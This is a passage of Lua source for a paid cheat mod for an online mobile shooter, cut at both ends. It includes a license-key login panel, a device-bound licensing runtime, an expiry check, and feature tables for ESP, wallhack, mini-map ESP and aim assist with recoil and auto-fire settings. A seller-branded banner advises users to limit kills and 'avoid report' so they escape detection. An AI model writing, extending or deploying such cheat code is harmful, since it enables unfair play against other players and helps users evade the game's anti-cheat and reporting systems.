            if data.event and data.eventHandle ~= nil then
                pcall(function() data.event:Remove(data.eventHandle) end)
            end
            if valid(data.container) then
                pcall(function() data.container:RemoveFromParent() end)
            end
            data.onSubmit = nil
        end
        function UI.Destroy()
            local previous = UI._data; UI._data = nil; detach(previous)
        end
        function UI.Hide()
            local data = UI._data
            if not data or data.hiddenApplied then return true end
            data.visible = false
            local ok = pcall(function()
                if valid(data.input) then data.input:SetText("") end
                if valid(data.container) then visibility(data.container, data.hidden) end
            end)
            if ok then data.hiddenApplied = true end
            return ok
        end
        function UI.SetStatus(message)
            UI._status = type(message) == "string" and message:sub(1, 160) or "Login unavailable"
            local data = UI._data
            if data and data.deliveredStatus == UI._status then return true end
            if data and valid(data.status) then
                local ok = pcall(function() data.status:SetText(UI._status) end)
                if ok then data.deliveredStatus = UI._status end
                return ok
            end
            return false
        end
        function UI.SetBusy(busy)
            UI._busy = busy == true
            local data = UI._data
            if data then
                if data.deliveredBusy == UI._busy then return true end
                local buttonOK = pcall(function() data.button:SetIsEnabled(not UI._busy) end)
                local inputOK  = pcall(function() data.input:SetIsEnabled(not UI._busy) end)
                if buttonOK and inputOK then data.deliveredBusy = UI._busy; return true end
            end
            return false
        end
        local function fitScale(parent)
            local result = 1
            pcall(function()
                local size = parent:GetCachedGeometry():GetLocalSize()
                local width, height = size.X, size.Y
                if type(width) == 'number' and type(height) == 'number'
                    and width > 24 and height > 24 then
                    result = math.min(1, (width - 24) / 500, (height - 24) / 248)
                end
            end)
            return result
        end
        function UI.Show(onSubmit)
            if type(onSubmit) ~= "function" then return false, "UI_SUBMIT_REQUIRED" end
            local data = UI._data
            if data and valid(data.parent)
                and math.abs(fitScale(data.parent) - (data.scale or 1)) > 0.001 then
                UI.Destroy(); data = nil
            end
            if data and valid(data.container) and valid(data.parent) then
                local ok = data.visible or pcall(function()
                    visibility(data.container, data.visibleEnum)
                end)
                if ok then
                    data.onSubmit, data.visible, data.hiddenApplied = onSubmit, true, false
                    UI.SetStatus(UI._status); UI.SetBusy(UI._busy); return true
                end
            end
            UI.Destroy()
            local okTools, uiTools = pcall(require, "GameLua.Mod.BaseMod.Common.UI.InGameUITools")
            local getRoot = okTools and member(uiTools, "GetMainControlBaseUI")
            if type(getRoot) ~= "function" then return false, "UI_NOT_READY" end
            local okRoot, root = pcall(getRoot)
            if not okRoot or not valid(root) then return false, "UI_NOT_READY" end
            local parent = member(root, "CanvasPanel_0")
            if not valid(parent) then parent = member(root, "CanvasPanel_42") end
            if not valid(parent) then return false, "UI_NOT_READY" end
            local game = global("CGame")
            if type(member(game, "NewObjectFromPath")) ~= "function" then
                return false, "UI_FACTORY_UNAVAILABLE"
            end
            local enums = member(global("UEnums"), "ESlateVisibility")
            local visibleEnum, hidden = member(enums, "Visible"), member(enums, "Collapsed")
            local passive = member(enums, "SelfHitTestInvisible")
            if visibleEnum == nil or hidden == nil or passive == nil then
                return false, "UI_ENUM_UNAVAILABLE"
            end
            UI._scale = fitScale(parent)
            data = {parent = parent, visible = false, onSubmit = onSubmit,
                    visibleEnum = visibleEnum, hidden = hidden, scale = UI._scale}
            local okBuild = pcall(function()
                local function make(class, outer)
                    local widget = game:NewObjectFromPath("/Script/UMG." .. class, outer)
                    assert(valid(widget), "UI_WIDGET_UNAVAILABLE")
                    return widget
                end
                data.container = make("CanvasPanel", parent)
                local function add(widget, x, y, width, height, z)
                    local slot = data.container:AddChildToCanvas(widget)
                    slot:SetAutoSize(false)
                    slot:SetPosition(vector(x * UI._scale, y * UI._scale))
                    slot:SetSize(vector(width * UI._scale, height * UI._scale))
                    slot:SetZOrder(z)
                    return slot
                end
                local background = make("Border", data.container)
                background:SetBrushColor(color(0.025, 0.035, 0.05, 0.98))
                visibility(background, visibleEnum)
                add(background, 0, 0, 500, 248, 0)
                local title = make("TextBlock", data.container)
                title:SetText("OWNER @YourSeller  Online Login")
                setTextStyle(title, 19, color(0.1, 0.9, 1, 1))
                visibility(title, passive); add(title, 22, 15, 456, 30, 1)
                data.input = make("EditableTextBox", data.container)
                data.input:SetText("")
                setTextStyle(data.input, 17, color(0.92, 0.94, 0.96, 1))
                pcall(function() data.input:SetHintText("Enter your key") end)
                visibility(data.input, visibleEnum); add(data.input, 22, 58, 456, 44, 2)
                local hint = make("TextBlock", data.container)
                hint:SetText("Enter your key, then tap LOGIN.")
                setTextStyle(hint, 12, color(0.72, 0.78, 0.83, 1))
                visibility(hint, passive); add(hint, 22, 106, 456, 20, 2)
                data.status = make("TextBlock", data.container)
                data.status:SetText(UI._status); data.deliveredStatus = UI._status
                setTextStyle(data.status, 13, color(0.92, 0.94, 0.96, 1))
                visibility(data.status, passive)
                pcall(function() data.status:SetAutoWrapText(true) end)
                add(data.status, 22, 129, 456, 54, 2)
                data.button = make("Button", data.container)
                visibility(data.button, visibleEnum)
                local label = make("TextBlock", data.button)
                label:SetText("LOGIN")
                setTextStyle(label, 17, color(0.05, 0.08, 0.12, 1))
                visibility(label, passive); data.button:AddChild(label)
                add(data.button, 150, 190, 200, 40, 2)
                data.event = data.button.OnClicked
                data.eventHandle = data.event:Add(function()
                    if UI._data ~= data or not data.visible or UI._busy then return end
                    local readOK, key = pcall(function() return data.input:GetText() end)
                    if not readOK or type(key) ~= "string" then
                        UI.SetStatus("Unable to read the key"); return
                    end
                    key = key:match("^%s*(.-)%s*$")
                    if key == "" or #key > 512 then UI.SetStatus("Enter a valid key"); return end
                    local submitOK = pcall(data.onSubmit, key)
                    if not submitOK then UI.SetBusy(false); UI.SetStatus("Login could not start") end
                end)
                local slot = parent:AddChildToCanvas(data.container)
                slot:SetAutoSize(false)
                slot:SetSize(vector(500 * UI._scale, 248 * UI._scale))
                slot:SetZOrder(9000)
                local anchors = slot:GetAnchors()
                anchors.Minimum, anchors.Maximum = vector(0.5, 0.5), vector(0.5, 0.5)
                slot:SetAnchors(anchors)
                slot:SetAlignment(vector(0.5, 0.5))
                slot:SetPosition(vector(0, 0))
                visibility(data.container, passive)
            end)
            if not okBuild then
                detach(data); return false, "UI_BUILD_UNAVAILABLE"
            end
            data.visible = true; UI._data = data; UI.SetBusy(UI._busy)
            return true
        end
        function UI.ShowNotice(message)
            local shown, reason = UI.Show(function() return false end)
            if not shown then return false, reason end
            UI.SetStatus(message); UI.SetBusy(true); return true
        end
        return UI
    end
    return Module
end)()

-- ============================================================================
-- 3. WELCOME UI  (unchanged)
-- ============================================================================
local YourSellerWelcomeUI = (function()
    local Module = {}
    function Module.new(env)
        env = env or _G
        local require = env.require or require
        local function global(n)
            local ok, v = pcall(function() return env[n] end)
            if ok then return v end
        end
        local function member(o, k)
            if o == nil then return nil end
            local ok, v = pcall(function() return o[k] end)
            if ok then return v end
        end
        local function valid(o)
            local c = member(global("slua"), "isValid")
            if o == nil then return false end
            if type(c) == 'function' then
                local ok, v = pcall(c, o)
                if ok and v == true then return true end
            end
            local g = global('Game'); local f = member(g, 'IsValid')
            if type(f) == 'function' then
                local ok, v = pcall(f, g, o)
                return ok and v == true
            end
            return false
        end
        local function imported(n)
            local l = global("import")
            if type(l) ~= "function" then return nil end
            local ok, v = pcall(l, n); if ok then return v end
        end
        local function construct(c, ...)
            if c == nil then return nil end
            local ok, v = pcall(c, ...); if ok then return v end
        end
        local function vector(x, y)
            return construct(global("FVector2D") or imported("Vector2D"), x, y) or {X = x, Y = y}
        end
        local function linear(v)
            v = v / 255
            if v <= 0.04045 then return v / 12.92 end
            return ((v + 0.055) / 1.055) ^ 2.4
        end
        local function color(r, g, b, a)
            r, g, b, a = linear(r), linear(g), linear(b), a or 1
            return construct(global("FLinearColor") or imported("LinearColor"), r, g, b, a)
                or {R = r, G = g, B = b, A = a}
        end
        local function visibility(w, v)
            local s = member(w, "SetWidgetVisibility") or member(w, "SetVisibility")
            if type(s) == 'function' then s(w, v) end
        end
        local WelcomeUI = {Width = 600, Height = 276}
        local WelcomeText = {
            "Welcome to @YourSeller Lua mod",
            "Kill limit 8-10",
            "Play smart and avoid report",
        }
        local UI = {_shown = false, _data = nil}
        local function detach(data)
            if not data then return end
            data.Visible = false
            if data.Event and data.EventHandle ~= nil then
                pcall(function() data.Event:Remove(data.EventHandle) end)
            end
            if valid(data.Container) then
                pcall(function() visibility(data.Container, data.Hidden) end)
                pcall(function() data.Container:RemoveFromParent() end)
            end
        end
        function UI:Destroy()
            local p = UI._data; UI._data = nil; detach(p)
        end
        local function parent()
            local okT, tools = pcall(require, "GameLua.Mod.BaseMod.Common.UI.InGameUITools")
            if not okT then return nil end
            local getRoot = member(tools, "GetMainControlBaseUI")
            if type(getRoot) ~= "function" then return nil end
            local ok, root = pcall(getRoot)
            if not ok or not valid(root) then return nil end
            local canvas = member(root, "CanvasPanel_0")
            if not valid(canvas) then canvas = member(root, "CanvasPanel_42") end
            if valid(canvas) then return root, canvas end
        end
        function UI:Show()
            if UI._shown and UI._data and valid(UI._data.Container) then
                visibility(UI._data.Container, UI._data.Passive)
                UI._data.Visible = true
                return true
            end
            UI:Destroy()
            local root, par = parent()
            if not par then return false, "WELCOME_ROOT_UNAVAILABLE" end
            local game = global("CGame")
            if type(member(game, "NewObjectFromPath")) ~= "function" then
                return false, "WELCOME_FACTORY_UNAVAILABLE"
            end
            local enums = member(global("UEnums"), "ESlateVisibility")
            local visible, hidden, passive = member(enums, "Visible"),
                member(enums, "Collapsed"), member(enums, "SelfHitTestInvisible")
            if visible == nil or hidden == nil or passive == nil then
                return false, "WELCOME_ENUM_UNAVAILABLE"
            end
            local data = {Root = root, Parent = par, Visible = false,
                          Hidden = hidden, Passive = passive}
            local ok = pcall(function()
                local function make(class, outer)
                    local w = game:NewObjectFromPath("/Script/UMG." .. class, outer)
                    assert(valid(w), "WELCOME_WIDGET_UNAVAILABLE")
                    return w
                end
                data.Container = make("CanvasPanel", par)
                visibility(data.Container, hidden)
                local function add(w, x, y, ww, hh, z)
                    local s = data.Container:AddChildToCanvas(w)
                    s:SetAutoSize(false)
                    s:SetPosition(vector(x, y))
                    s:SetSize(vector(ww, hh))
                    s:SetZOrder(z)
                    return s
                end
                local function rect(x, y, ww, hh, c, z)
                    local w = make("Border", data.Container)
                    w:SetBrushColor(c)
                    visibility(w, passive)
                    add(w, x, y, ww, hh, z)
                    return w
                end
                local slateColor
                pcall(function() slateColor = imported("SlateColor") end)
                local function textStyle(w, size, c)
                    local font = member(w, "Font")
                    if font ~= nil then
                        if type(font) == 'table' then
                            local copy = {}
                            for k, v in pairs(font) do copy[k] = v end
                            font = copy
                        end
                        font.Size = size
                        pcall(function() w:SetFont(font) end)
                    end
                    pcall(function() w:SetColorAndOpacity(slateColor and slateColor(c) or c) end)
                    pcall(function() w:SetJustification(1) end)
                    visibility(w, passive)
                end
                local function text(value, x, y, ww, hh, size, c, z)
                    local w = make("TextBlock", data.Container)
                    w:SetText(value)
                    textStyle(w, size, c)
                    pcall(function() w:SetAutoWrapText(true) end)
                    add(w, x, y, ww, hh, z)
                    return w
                end
                local W, H = WelcomeUI.Width, WelcomeUI.Height
                rect(4, 6, W, H, color(18, 5, 10, 0.25), 0)
                rect(0, 0, W, H, color(186, 137, 74), 1)
                rect(2, 2, W - 4, H - 4, color(255, 244, 214), 2)
                local stops = {{116, 16, 46}, {169, 38, 47}, {194, 105, 35}}
                local segments = 64
                for i = 0, segments - 1 do
                    local t = i / (segments - 1)
                    local left, right, blend
                    if t <= 0.5 then left, right, blend = stops[1], stops[2], t * 2
                    else left, right, blend = stops[2], stops[3], (t - 0.5) * 2 end
                    local x0 = 2 + (W - 4) * i / segments
                    local x1 = 2 + (W - 4) * (i + 1) / segments
                    rect(x0, 2, math.min(W - 2, x1 + 0.3) - x0, 76,
                        color(left[1] + (right[1] - left[1]) * blend,
                              left[2] + (right[2] - left[2]) * blend,
                              left[3] + (right[3] - left[3]) * blend), 3)
                end
                rect(18, 3, W - 36, 1, color(255, 255, 255, 0.32), 4)
                rect(2, 78, W - 4, 3, color(238, 188, 93), 4)
                local title = text(WelcomeText[1], 24, 23, W - 48, 44, 19, color(255, 253, 247), 5)
                pcall(function() title:SetShadowOffset(vector(0, 1)) end)
                pcall(function() title:SetShadowColorAndOpacity(color(40, 3, 12, 0.45)) end)
                rect(30, 100, W - 60, 54, color(255, 226, 159), 3)
                rect(30, 100, 4, 54, color(160, 33, 49), 4)
                text(WelcomeText[2], 46, 110, W - 92, 38, 23, color(115, 25, 45), 5)
                text(WelcomeText[3], 30, 168, W - 60, 32, 17, color(130, 34, 47), 5)
                local button = make("Button", data.Container)
                pcall(function() button:SetBackgroundColor(color(131, 25, 47)) end)
                visibility(button, visible)
                local label = make("TextBlock", button)
                label:SetText("OK")
                textStyle(label, 17, color(255, 251, 238))
                local ls = button:AddChild(label)
                pcall(function() ls:SetHorizontalAlignment(2) end)
                pcall(function() ls:SetVerticalAlignment(2) end)
                add(button, (W - 164) / 2, 212, 164, 42, 6)
                data.Event = member(button, "OnClicked")
                data.EventHandle = data.Event:Add(function()
                    if UI._data == data and data.Visible then UI:Destroy() end
                end)
                local slot = par:AddChildToCanvas(data.Container)
                slot:SetAutoSize(false)
                slot:SetSize(vector(W, H))
                slot:SetZOrder(9200)
                local anchors = slot:GetAnchors()
                anchors.Minimum, anchors.Maximum = vector(0.5, 0.5), vector(0.5, 0.5)
                slot:SetAnchors(anchors)
                slot:SetAlignment(vector(0.5, 0.5))
                slot:SetPosition(vector(0, 0))
                visibility(data.Container, passive)
            end)
            if not ok then detach(data); return false, "WELCOME_BUILD_FAILED" end
            data.Visible = true
            UI._data = data
            UI._shown = true
            return true
        end
        function UI:Hide() if UI._data then detach(UI._data) end; UI._data = nil end
        function UI:IsShown() return UI._shown == true end
        return UI
    end
    return Module
end)()
_G.YourSellerWelcomeUI = YourSellerWelcomeUI

-- ============================================================================
-- 4. LICENSE RUNTIME  (unchanged)
-- ============================================================================
local YourSellerLicenseRuntime = (function()
    local Runtime = {}
    Runtime.__index = Runtime
    local function finite(n)
        return type(n) == 'number' and n == n and n >= 0 and n < math.huge
    end
    local function read(o, k)
        if o == nil then return nil end
        local ok, v = pcall(function() return o[k] end)
        if ok then return v end
    end
    local function static(o, k, ...)
        local fn = read(o, k)
        if type(fn) ~= 'function' then return nil end
        local ok, v = pcall(fn, ...); if ok then return v end
    end
    local function call(o, k, ...)
        local fn = read(o, k)
        if type(fn) ~= 'function' then return nil end
        local ok, v = pcall(fn, o, ...); if ok then return v end
    end
    local function validConfig(c)
        return type(c) == 'table' and type(c.url) == 'string' and c.url:match('^https://') ~= nil
            and type(c.game) == 'string' and #c.game > 0
            and type(c.secret) == 'string' and #c.secret > 0
            and finite(c.timeout) and c.timeout > 0 and finite(c.clockSkew)
    end
    function Runtime.new(env, config, Core, LoginUI)
        local self = setmetatable({
            env = env or _G, reason = 'login_required', active = false,
            ready = false, disposed = false, uiRetryAt = 0, uiFailures = 0
        }, Runtime)
        if not validConfig(config) or type(Core) ~= 'table' or type(Core.new) ~= 'function'
            or type(Core.Primitives) ~= 'table' then
            self.reason = 'license_dependencies_unavailable'; return self
        end
        local cfg = {}
        for k, v in pairs(config) do cfg[k] = v end
        self.timeout = cfg.timeout
        if type(LoginUI) == 'table' and type(LoginUI.new) == 'function' then
            local ok, ui = pcall(LoginUI.new, self.env)
            if ok and type(ui) == 'table' then self.ui = ui end
        end
        if type(_G.YourSellerWelcomeUI) == 'table' and type(_G.YourSellerWelcomeUI.new) == 'function' then
            local okW, w = pcall(_G.YourSellerWelcomeUI.new, self.env)
            if okW and type(w) == 'table' then self.welcome = w end
        end
        self.welcomeShownThisSession = (_G.__YourSeller_WELCOME_SHOWN_SESSION == true)
        self.welcomeScheduledAt = nil
        self.welcomeDelaySeconds = 3.0
        self.submit = function(key) return self:login(key) end
        local ok, auth = pcall(Core.new, cfg, {
            clock = function() return self:_clock() end,
            wall = function()
                local value = static(read(self.env, 'os'), 'time')
                if finite(value) and value > 0 then return value end
            end,
            serial = function(key)
                local client = read(self.env, 'Client')
                local value = static(client, 'GetPhoneDeviceID')
                assert(type(value) == 'string' and #value > 0 and #value <= 512,
                    'DEVICE_ID_UNAVAILABLE')
                return Core.Primitives.name_uuid('YourSeller-LUA-V1\0' .. key .. '\0' .. value)
            end,
            decode = function(raw)
                local json = self:_module('json', nil, 'common.json_util', 'decode')
                assert(json, 'JSON_UNAVAILABLE')
                return json.decode(raw)
            end,
            post = function(url, headers, body, callback, timeout)
                local manager = read(self.env, 'ModuleManager')
                local config = read(manager, 'CommonModuleConfig')
                local getter = read(manager, 'GetModule')
                assert(type(getter) == 'function' and config, 'HTTP_MANAGER_UNAVAILABLE')
                local http = getter(read(config, 'http_manager'))
                local post = read(http, 'Post')
                assert(type(post) == 'function', 'HTTP_POST_UNAVAILABLE')
                return post(http, url, headers, body, nil, callback, timeout)
            end,
            status = function(message, phase)
                self.active = false
                self.reason = phase == 'active' and 'waiting_maintenance' or 'login_required'
                self:_ui('SetStatus', message)
                self:_ui('SetBusy', phase == 'pending')
                if phase == 'active' then self:_ui('Hide') end
            end,
        })
        if ok and type(auth) == 'table' then self.auth = auth
        else self.reason = 'license_initialization_unavailable' end
        return self
    end
    function Runtime:_module(cache, globalName, path, method)
        local found = globalName and read(self.env, globalName)
        if type(read(found, method)) == 'function' then return found end
        found = self[cache]
        if type(read(found, method)) == 'function' then return found end
        local loader = read(self.env, 'require')
        if type(loader) == 'function' then
            local ok, value = pcall(loader, path)
            if ok and type(read(value, method)) == 'function' then
                self[cache] = value; return value
            end
        end
    end
    function Runtime:_valid(object)
        if object == nil then return false end
        if static(read(self.env, 'slua'), 'isValid', object) == true then return true end
        return call(read(self.env, 'Game'), 'IsValid', object) == true
    end
    function Runtime:_clock()
        local world = static(read(self.env, 'slua'), 'getWorld')
        if world == nil then return nil end
        local statics = read(self.env, 'GameplayStatics') or self.statics
        if type(read(statics, 'GetRealTimeSeconds')) ~= 'function' then
            local loader = read(self.env, 'import')
            if type(loader) == 'function' then
                local ok, value = pcall(loader, 'GameplayStatics')
                if ok then statics = value end
            end
        end
        if type(read(statics, 'GetRealTimeSeconds')) ~= 'function' then return nil end
        self.statics = statics
        local now = static(statics, 'GetRealTimeSeconds', world)
        if finite(now) then return now, world end
    end
    function Runtime:_readGameplay(world)
        local data = read(self.env, 'GameplayData') or self.gameplayData
        if data == nil then
            local loader = read(self.env, 'require')
            if type(loader) == 'function' then
                local ok, value = pcall(loader, 'GameLua.GameCore.Data.GameplayData')
                if ok and value ~= nil then self.gameplayData = value; data = value end
            end
        end
        local pc = static(data, 'GetPlayerController')
        if not self:_valid(pc) and not self:_valid(read(pc, 'Object')) then
            pc = call(read(self.env, 'slua_GameFrontendHUD'), 'GetPlayerController')
        end
        if not self:_valid(pc) and not self:_valid(read(pc, 'Object')) then
            return nil, 'waiting_controller'
        end
        local pawn = static(data, 'GetPlayerCharacter')
        if not self:_valid(pawn) then pawn = static(data, 'GetLocalCharacter') end
        for _, method in ipairs({'GetPlayerCharacterSafety', 'GetCurPawn', 'GetPawn'}) do
            if not self:_valid(pawn) then pawn = call(pc, method) end
            if not self:_valid(pawn) then pawn = call(read(pc, 'Object'), method) end
        end
        if not self:_valid(pawn) then return nil, 'waiting_pawn' end
        local tools = self:_module('tools', nil,
            'GameLua.Mod.BaseMod.Common.UI.InGameUITools', 'GetMainControlBaseUI')
        local root = static(tools, 'GetMainControlBaseUI')
        if not self:_valid(root) then return nil, 'waiting_control_ui' end
        local status = self:_module('gameStatus', 'GameStatus',
            'client.common.game_status', 'IsInFightingStatus')
        local loading = self:_module('loading', nil,
            'client.slua.logic.loading.logic_loading', 'IsShowing')
        if not status or not loading then return nil, 'readiness_services_unavailable' end
        if static(status, 'IsInFightingStatus') ~= true then return nil, 'waiting_gameplay' end
        if static(loading, 'IsShowing') ~= false then return nil, 'waiting_loading' end
        return {world = world, controller = pc, pawn = pawn, root = root}
    end
    local function same(a, b)
        return a and b and a.world == b.world and a.controller == b.controller
            and a.pawn == b.pawn and a.root == b.root
    end
    function Runtime:_ui(method, ...)
        local fn = read(self.ui, method)
        if type(fn) ~= 'function' then return false, 'UI_UNAVAILABLE' end
        local ok, value, reason = pcall(fn, ...)
        if not ok then return false, 'UI_TEMPORARILY_UNAVAILABLE' end
        return value, reason
    end
    function Runtime:_clearReadiness(reason)
        self.active, self.ready = false, false
        self.identity, self.readySince, self.maintenanceAt, self.maintenanceWorld = nil, nil, nil, nil
        self.reason = reason
        self:_ui('Hide')
    end
    function Runtime:_showPanel(now, state, blocked)
        if now < self.uiRetryAt then return false end
        local shown, uiReason
        if blocked then shown, uiReason = self:_ui('ShowNotice', state.message)
        else shown, uiReason = self:_ui('Show', self.submit) end
        if shown then
            self.uiFailures, self.uiError = 0, nil
            self:_ui('SetStatus', state.message)
            self:_ui('SetBusy', blocked or state.pending)
        else
            self.uiFailures = self.uiFailures + 1
            self.uiRetryAt = now + (self.uiFailures >= 10 and 5 or 1)
            self.uiError = type(uiReason) == 'string' and uiReason:match('^UI_[A-Z_]+$')
                or 'UI_UNAVAILABLE'
        end
        return shown == true
    end
    function Runtime:update()
        if self.disposed then self.reason = 'disposed'; return false end
        if not self.auth then return false end
        local tickOK = pcall(self.auth.Tick)
        if not tickOK then
            self.auth.FailClosed('License maintenance unavailable.')
            self:_clearReadiness('license_maintenance_unavailable'); return false
        end
        local now, world = self:_clock()
        if not now then self:_clearReadiness('clock_unavailable'); return false end
        local ready, reason = self:_readGameplay(world)
        if not ready then self:_clearReadiness(reason); return false end
        if not same(self.identity, ready) or not self.readySince or now < self.readySince then
            self.identity, self.readySince = ready, now
        end
        self.ready = now - self.readySince >= 3
        self.maintenanceAt, self.maintenanceWorld = now, world
        self.active = self.ready and self.auth.IsAuthorized()
        if not self.ready then
            self.reason = 'waiting_stable_gameplay'; self:_ui('Hide'); return false
        end
        local state = self.auth.GetState()
        if self.active then
            self.reason = 'active'
            self:_ui('Hide')
            if self.welcome and not self.welcomeShownThisSession then
                if not self.welcomeScheduledAt then self.welcomeScheduledAt = now end
                if self.welcomeScheduledAt
                    and (now - self.welcomeScheduledAt) >= self.welcomeDelaySeconds then
                    local shown = false
                    pcall(function()
                        if self.welcome:Show() then shown = true end
                    end)
                    if shown then
                        self.welcomeShownThisSession = true
                        _G.__YourSeller_WELCOME_SHOWN_SESSION = true
                        self.welcomeScheduledAt = nil
                    else
                        self.welcomeScheduledAt = now
                    end
                end
            end
            return true
        end
        self.reason = 'login_required'
        if state.restartRequired or state.phase == 'expired' or state.phase == 'tampered' then
            self.reason = state.restartRequired and 'restart_required' or state.phase
            self:_showPanel(now, state, true); return false
        end
        if not self:_showPanel(now, state, false) and self.uiError then
            self.reason = 'login_ui_unavailable'
        end
        return false
    end
    function Runtime:isActive()
        if self.disposed or not self.auth or not self.active or not self.ready then return false end
        if not self.auth.IsAuthorized() then self.active = false; return false end
        local now, world = self:_clock()
        if not now or world ~= self.maintenanceWorld or not self.maintenanceAt
            or now < self.maintenanceAt or now - self.maintenanceAt >= 3 then
            self.active = false; self.reason = 'maintenance_stale'; return false
        end
        return true
    end
    function Runtime:login(key)
        if self.disposed or not self.auth then return false end
        if self.auth.IsAuthorized() then return true end
        local now, world = self:_clock()
        if not self.ready or not now or world ~= self.maintenanceWorld
            or not self.maintenanceAt or now < self.maintenanceAt
            or now - self.maintenanceAt >= 3 then return false end
        local identity = self:_readGameplay(world)
        if not same(identity, self.identity) then
            self:_clearReadiness('waiting_stable_gameplay'); return false
        end
        local ok, accepted = pcall(self.auth.Login, key)
        if not ok then self.auth.FailClosed('Login could not start.'); return false end
        return accepted == true
    end
    function Runtime:getStatus()
        local active = self:isActive()
        local state = self.auth and self.auth.GetState() or {}
        return {
            authorized = active, sessionAuthorized = state.authorized == true,
            phase = state.phase or 'locked',
            message = state.message or 'License dependencies unavailable.',
            reason = self.reason, pending = state.pending == true,
            gameplayReady = self.ready, expiresAt = state.expiresAt,
            accessPolicy = 'game_session', expiryCheckPolicy = 'login_only',
            clockProtection = 'login_only', periodicRecheck = false,
            loginDelaySeconds = 3, restartRequired = state.restartRequired == true,
            uiError = self.uiError,
            lastRequestLatencyMs = state.lastRequestLatencyMs,
            latencyScope = 'license_http_round_trip', disposed = self.disposed
        }
    end
    function Runtime:logout()
        self.active = false
        if self.auth then self.auth.Logout() end
        self.reason = 'login_required'; return true
    end
    function Runtime:dispose()
        if self.disposed then return true end
        self:logout(); self.disposed = true; self.ready = false
        self:_ui('Destroy'); self.reason = 'disposed'
        self.submit = nil
        return true
    end
    return Runtime
end)()

-- ============================================================================
-- 5. EXPIRY FALLBACK
-- ============================================================================
local EXPIRY_TIMESTAMP = os.time({year = 2026, month = 8, day = 20, hour = 0, min = 0, sec = 0})
local YourSellerESPLicenseInstance

function CheckExpiration()
    if YourSellerESPLicenseInstance then
        local active = false
        pcall(function() active = YourSellerESPLicenseInstance:isActive() end)
        if active then
            _G._MOD_EXPIRED = false
            return true
        end
    end
    local now = os.time()
    local remaining = EXPIRY_TIMESTAMP - now
    if remaining <= 0 then
        _G._MOD_EXPIRED = true
        return false
    end
    _G._MOD_EXPIRED = false
    _G._MOD_REMAINING_SECONDS = remaining
    return true
end

function _G.TryShowWelcome()
    if _G.WelcomeShown then return end
    if not CheckExpiration() then return end
    _G.WelcomeShown = true
end

-- ============================================================================
-- 6. AK FEATURES
-- ============================================================================
_G.AK_Features = {
    {id = "EspNameHP",    name = "ESP HP + Name",  val = 0, type = "toggle"},
    {id = "ESP_HP",       name = "ESP Health Bar", val = 0, type = "toggle"},
    {id = "ESP_BOX",      name = "ESP Box",        val = 0, type = "toggle"},
    {id = "ESP_LINE",     name = "ESP Head Line",  val = 0, type = "toggle"},
    {id = "ENEMY_COUNT",  name = "Enemy Counter",  val = 0, type = "toggle"},
    {id = "ESP_MAP",      name = "Mini Map ESP",   val = 0, type = "toggle"},
    {id = "ESP_WALLHACK", name = "Wallhack",       val = 0, type = "toggle"},
}

function _G.AK_GetVal(featureId)
    if _G.YourSeller_Config and _G.YourSeller_Config[featureId] ~= nil then
        return tonumber(_G.YourSeller_Config[featureId]) or 0
    end
    if _G.AK_Features then
        for _, feature in ipairs(_G.AK_Features) do
            if feature.id == featureId then return feature.val end
        end
    end
    return 0
end

-- ========================================== 
-- CONFIG
-- ========================================== 
_G.YourSellerConfig = _G.YourSellerConfig or {
    IpadView = false,
    IPadFov = 110,
    ModSkin = false,
    UnlockFPS = false,
    AimTouchEnable = false,
    AimTouchHipIgKnock = false,
    AimTouchHipIgBot = false,
    AimTouchHipVisCheck = false,
    AimTouchHipfire = false,
    AimTouchScopeAll = false,
    AimTouchScopeIgKnock = false,
    AimTouchScopeIgBot = false,
    AimTouchScopeVisCheck = false,
    AimTouchScopeSniper = false,
    AimTouchSniperIgKnock = false,
    AimTouchSniperIgBot = false,
    AimTouchSniperVisCheck = false,
    AimTouchSG = false,
    AimTouchSGAutoFire = false,
    AimTouchSGIgKnock = false,
    AimTouchSGIgBot = false,
    AimTouchSGVisCheck = false,
}

_G.YourSeller = _G.YourSeller or {
    LoopToken = 0,
    IsAutoFiring = false,
    CustomTextData = {
        IPadFov = 110,
        AimTouchHipPrio = 1,
        AimTouchHipBone = 1,
        AimTouchHipCond = 1,
        AimTouchHipSpeed = 100,
        AimTouchHipFOV = 100,
        AimTouchHipDist = 250,
        AimTouchSGPrio = 1,
        AimTouchSGBone = 2,
        AimTouchSGCond = 1,
        AimTouchSGSpeed = 80,
        AimTouchSGFOV = 40,
        AimTouchSGDist = 30,
        AimTouchScopePrio = 1,
        AimTouchScopeBone = 1,
        AimTouchScopeCond = 2,
        AimTouchScopeSpeed = 100,
        AimTouchScopeFOV = 100,
        AimTouchScopeDist = 300,
        AimTouchScopePred = 30,
        AimTouchScopeRecoil = 19,
        AimTouchSniperPrio = 1,
        AimTouchSniperBone = 1,
        AimTouchSniperCond = 2,
        AimTouchSniperSpeed = 100,
        AimTouchSniperFOV = 100,
        AimTouchSniperDist = 400,
        AimTouchSniperPred = 30
    }
}

-- ============================================================================
-- 6.1. CONFIG SYSTEM (YourSeller.h file se features on/off)
-- ============================================================================
local CONFIG_PATH = "/storage/emulated/0/Android/data/com.tencent.ig/files/YourSeller.h"

_G.YourSeller_Config = _G.YourSeller_Config or {
    ESP_HP       = 0,
    ESP_BOX      = 0,
    ESP_LINE     = 0,
    ENEMY_COUNT  = 0,
    ESP_MAP      = 0,
    ESP_WALLHACK = 0,
    EspNameHP    = 0,
}

local function readConfig()
    local cfg = {}
    local file = io.open(CONFIG_PATH, "r")
    if not file then return nil end
    for line in file:lines() do
        local key, value = line:match("([^=]+)=(.+)")
        if key and value then
            key = key:gsub("%s+", "")
            value = value:gsub("%s+", "")
            local num = tonumber(value)
            if num then cfg[key] = num else cfg[key] = value end
        end
    end
    file:close()
    return cfg
end

local function applyConfig()
    if _G.__ModMenuTouched then return end
    local cfg = readConfig()
    if not cfg then return end
    for k, v in pairs(cfg) do
        if _G.YourSeller_Config[k] ~= nil then
            _G.YourSeller_Config[k] = v
        end
    end
    if _G.AK_Features then
        for _, feature in ipairs(_G.AK_Features) do
            local cfgVal = _G.YourSeller_Config[feature.id]
            if cfgVal ~= nil then feature.val = tonumber(cfgVal) or 0 end
        end
    end
end

applyConfig()

_G.YourSeller_ConfigReload = function()
    applyConfig()
end

-- ==============================================================================
-- ================= DATA & LOGIC MOD SKIN ======================================
-- ==============================================================================
_G.VIP_Attachments = {
    [1101004236]={1010042307,1010042306,1010042308,1010042304,1010042300,1010042305,1010042299,1010042298,1010042297,1010042296,1010042295,1010042294,0,1010042314,1010042309,1010042316,1010042317,1010042318,1010042310,1010042315,1010042319,0},
